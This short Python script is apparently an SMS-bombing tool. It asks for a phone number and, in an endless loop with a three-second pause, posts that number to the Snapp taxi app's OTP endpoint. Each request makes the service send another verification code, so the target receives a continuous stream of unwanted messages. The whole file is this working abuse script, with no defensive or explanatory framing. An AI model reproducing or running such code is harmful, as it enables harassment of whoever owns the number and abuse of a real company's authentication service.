import time
import requests

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
num = input('phone number:')

my_data= {"cellphone":"+98"+num}

while True:
    send = requests.post(url ,data=my_data)
    print(send)
    time.sleep(3)
